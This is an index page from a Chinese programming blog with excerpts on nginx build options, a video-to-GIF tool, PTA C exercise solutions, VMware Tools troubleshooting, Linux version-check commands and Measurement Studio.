ngx_stream_geoip_module --with-stream_geoip_module=dynamic enable dynamic ngx_stream_geoip_module --with-stream_ssl_preread_module enable ngx_stream_ssl_preread_module --without-stream_limit_conn_module disable ngx_stream_limit_conn_module --without-stream_access_module disable ngx_stream_access_module --without-stream_geo_module disable ngx_stream_geo_module --without-stream_map_module disable ngx_stream_map_module --without-stream_split_clients_module disable ngx_stream_split_clients_module --without-stream_return_module disable ngx_stream_return_module --without-stream_upstream_hash_module disable ngx_stream_upstream_hash_module --without-stream_upstream_least_conn_module disable ngx_stream_upstream_least_conn_module --without-stream_upstream_zone_module disable ngx_stream_upstream_zone_module --with-google_perftools_module enable ngx_google_perftools_module --with-cpp_test_module enable ngx_cpp_test_module --add-module=PATH enable external module --add-dynamic-module=PATH enable dynamic external module --with-compat dynamic modules compatibility --with-cc=PATH set C compiler pathname --with-cpp=PATH set C preprocessor pathname --with-cc-opt=OPTIONS set additional C compiler options --with-ld-opt=OPTIONS set additional linker options --with-cpu-opt=CPU build for the specified CPU, valid values: pentium, pentiumpro, pentium3, pentium4, athlon, opteron, sparc32, sparc64, ppc64 --without-pcre disable PCRE library usage --with-pcre force PCRE library usage --with-pcre=DIR set path to PCRE library sources --with-pcre-opt=OPTIONS set additional build options for PCRE --with-pcre-jit build PCRE with JIT compilation support --with-zlib=DIR set path to zlib library sources --with-zlib-opt=OPTIONS set additional build options for zlib --with-zlib-asm=CPU use zlib assembler sources optimized for the specified CPU, valid values: pentium, pentiumpro --with-libatomic force libatomic_ops library usage --with-libatomic=DIR set path to libatomic_ops library sources --with-openssl=DIR set path to OpenSSL library sources --with-openssl-opt=OPTIONS set additional build options for OpenSSL --with-debug enable debug logging NGINX stream (4层解决方案) # .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/440c05f29d76636aa030f17b3a040a9b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87f6a4689b0c726ba63ff280f98f202e/" rel="bookmark">
			视频如何提取动图？一分钟教你在线提取gif动画
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		想要从一段视频中截取gif动图，非常的简单。只需要使用专业的视频gif转换器-【GIF中文网】的视频转gif（https://www.gif.cn/）功能，上传MP4格式的视频，就能够一键快速提取gif图片，无需下载任何软件，支持生成1分钟或是600帧以内的gif动图。超清画质导出，手机、pc均可在线操作。具体方法如下：
点击“视频转gif”，上传mp4格式的视频，如果上传失败可以将视频拖拽至微信并再次下载即可。
选择“开始取图-停止取图-取图完成”，设置生成gif动图的尺寸大小、图片质量、播放速度等参数，点击开始生成gif。
生成后点击下载图片即完成。
视频在线转换gif动图完成后，如果生成的gif动画体积较大可使用gif在线压缩功能，上传动图即可快速缩小gif图片大小，方便快捷省时省力。希望以上内容能够帮助到大家。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a72ce358bbb86f4ebbd4d27f8cfcc274/" rel="bookmark">
			PTA 7-4 4104 Soundex编码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Soundex编码是根据单词的拼写和发音相似性来对单词进行分组，例如，“can”与“khawn”, “con”与“gone”在Soundex编码下是相同的。
Soundex编码方法将每个单词转换成一串数字，每个数字代表一个字母。具体如下：
1 表示B、F、P或V；
2 表示C、G、J、K、Q、S、X或Z；
3 表示D或T；
4 表示L；
5 表示M或N；
6 表示R。
字母A，E，I，0，U，H，W和Y在Soundex中不用编码的，可以直接忽略。相邻的并且具有相同编码值的字母只用一个对应的数字表示。具有相同Soundex编码值的单词被认为是相同的单词。
输入格式: 输入文件中的每行为一个单词，全部大写，不超过20个字母。
输出格式: 对输入文件中的每个单词，输出该单词的Soundex编码，占一行。
输入样例: KHAWN
PFISTER
BOBBY
输出样例: 25
1236
11
解题代码: #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { int i,b[21]; char a[21]; while(scanf("%s",a)!=EOF) { a[20]={0}; b[20]={0}; for(i=0;a[i]!='\0';i++) { if((a[i]=='B')+(a[i]=='F')+(a[i]=='P')+(a[i]=='V')==1) b[i]=1; else if((a[i]=='C')+(a[i]=='G')+(a[i]=='J')+(a[i]=='K')+(a[i]=='Q')+(a[i]=='S')+(a[i]=='X')+(a[i]=='Z')==1) b[i]=2; else if((a[i]=='D')+(a[i]=='T')==1) b[i]=3; else if(a[i]=='L') b[i]=4; else if((a[i]=='M')+(a[i]=='N')==1) b[i]=5; else if(a[i]=='R') b[i]=6; else b[i]=0; } if(b[0]!=0) printf("%d",b[0]); for(i=1;i&lt;strlen(a);i++) if(b[i]!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a72ce358bbb86f4ebbd4d27f8cfcc274/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6af1a21ed5874a6e18723f098cc96e4e/" rel="bookmark">
			PTA 7-3 4103 All in All
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 给定两个字符串s和t，判断s是否是t的子序列。即从t中删除一些字符，将剩余的字符连接起来，即可获得s。
输入格式: 输入文件包括多组测试数据，每组测试数据占一行，包括两个由ASCII码组成的字符串s和t，它们的长度都不超过100000。
输出格式: 对于每个测试数据输出一行，如果s是t的子序列，则输出“Yes”，否则输出“No”。
输入样例: sequence subsequence
person compression
VERDI vivaVittorioEmanueleReDiItalia
caseDoesMatter CaseDoesMatter
输出样例: Yes
No
Yes
No
解题代码: #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { int i,j; char a[100000],b[100000]; while(scanf("%s %s",a,b)!=EOF) { for(i=0,j=0;a[i]!='\0';i++) { for(;b[j]!='\0';j++) if(a[i]==b[j]) break; if(j==strlen(b)) break; } if(i&lt;strlen(a)-1) printf("No\n"); else printf("Yes\n"); } return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76440fd3ebcaf6db8b139201626300e2/" rel="bookmark">
			VMware 共享文件夹显示不出来、重新安装 VMware Tools 是灰色的
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.VMware 共享文件夹显示不出来2.重新安装 VMware Tools 是灰色的 1.VMware 共享文件夹显示不出来 在 VMware Workstation 16 Pro 中安装 Ubuntu Server 16.04.7 时，默认会安装 open-vm-tools，当时卡了好久才安装成功，但是默认安装的功能好像不完善，共享文件夹显示不出来。
如下图所示，虽然启用了共享文件夹，但是在 /mnt/hgfs 目录下看不到共享文件夹。
VMware Tools 是官方提供的。open-vm-tools 是 VMware Tools 的开源实现，官方也推荐使用。但是，open-vm-tools 和 VMware Tools 好像存在冲突，两者任选一个即可。
为了解决上述问题，这里我卸载 open-vm-tools、选用 VMware Tools。
卸载 open-vm-tools 的命令如下：
sudo apt-get autoremove open-vm-tools --purge 2.重新安装 VMware Tools 是灰色的 接下来进行 VMware Tools 的安装，但是突然发现“重新安装VMware Tools”这个选项是灰色的，无法点击。
解决方法其实很简单：不要等 Ubuntu Server 16.04.7 完全开机之后再去点击“重新安装VMware Tools”，而是在 Ubuntu Server 16.04.7 开机过程中去点击“重新安装VMware Tools”，此时就可以点击成功，并自动向虚拟机中插入了 CD/DVD，同时自动加载了 VMware Workstation 16 Pro 安装目录下的 linux.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/76440fd3ebcaf6db8b139201626300e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/196ccbb4b79b50fa0e8677701e55e566/" rel="bookmark">
			Linux系统查看版本、位数（32位或64位）、架构（arm或amd）的命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里是Ubuntu linux系统；
1 查看版本的命令 输入命令：
lsb_release -a 显示：
root@iZ2ze0zuq27nx0z96tt9g:/opt# lsb_release -a LSB Version:	core-11.1.0ubuntu2-noarch:security-11.1.0ubuntu2-noarch Distributor ID:	Ubuntu Description:	Ubuntu 20.04.3 LTS Release:	20.04 Codename:	focal 2 查看位数（32位或64位）的命令 输入命令：
getconf LONG_BIT 显示：
root@iZ2ze0zuq27nx0z96tt9g:/opt# getconf LONG_BIT 64 3 查看架构（arm或amd）的命令 输入命令：
dpkg --print-architecture 显示：
root@iZ2ze0zuq27nx0z96tt9g:/opt# dpkg --print-architecture amd64 补充：amd （intelx86架构）和arm版本区别。
x86和arm架构定位不同：
arm基于精简指令(RISC)，本身定位于嵌入式平台，简化了硬件逻辑的设计，减少了晶体管，从而降低功耗，流水线等控制并不复杂，进一步降低了晶体管数量，主要是面对轻量级的、目标明确单一的程序，所以主要都是移动端使用；x86基于复杂指令集CISC，有很多机器指令，只为完成某项专门任务，所以使得硬件逻辑很复杂，加上其他流水线指令集并行、超线程、虚拟化等，复杂度很高，晶体管数量庞大，主要定位计算密集场景，例如多媒体编辑、科研计算等。 总之，arm是为了低功耗，x86是为了高性能。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0be4b1e0debd1562cf68651e7a59d9bb/" rel="bookmark">
			Measurement Studio​ 2019 R3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​Measurement Studio​的​功能
Measurement Studio​是​唯一​一​款.NET​工具​套​件，​专​为​在​Microsoft Visual Studio​中​构​建​工程​应用，​主要​用于​采集、​分析​并​显示​测量​数据。​您​可以​使用​与​硬件​采集​数据​类型​兼容​的​工程​UI​控​件，​清晰​明​了​地​展示​数据。​
Measurement Studio​具有​高级​且​直观​的​面向​对象​硬件​类​库，​简化​了​硬件​通信​的​复杂​性。​您​可以​使用​业界​最快、​最​灵活​且​最​适合​将​测量​数据​存​盘​的​格式​TDMS，​将​自​定义​信息​添加​到​采集​的​数据​中。
​您​还​可以​对​采集​的​信号​进行​实​时​在​线​分析，​而无​需​艰难​地​编写​自​定义​解析​算法。
无论​采用​何​种​方法​采集​数据，​您​均可​使用​支​持​所用​开发​语言​的​高层​界面​来​编​程​硬件。
使用​Measurement Studio​工程​UI​控​件，​开发​沉浸​式​Windows​应用​程序，​重新​定义​您​的​用户​体验。
500​多个​分析​函数​任​您​选择，​包括​曲线​拟​合、​频​谱​分析、​数据​统计​和​可​视​化，​帮助​您​更好​地​理解​数据。
Measurement Studio 是一组 .NET 工具，专为构建工程应用程序而设计。您可以使用与硬件获取的数据类型兼容的工程 UI 控件清晰地呈现数据。Measurement Studio 通过高级、直观、面向对象的硬件类库消除了硬件通信的复杂性。您可以使用最快、最灵活的文件格式将测量数据存储到磁盘，TDMS，将自定义信息添加到采集的数据中。您还可以对采集的信号进行实时在线分析，而无需编写自定义解析算法的艰巨任务。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/111/">«</a>
	<span class="pagination__item pagination__item--current">112/321</span>
	<a class="pagination__item pagination__item--next btn" href="/page/113/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>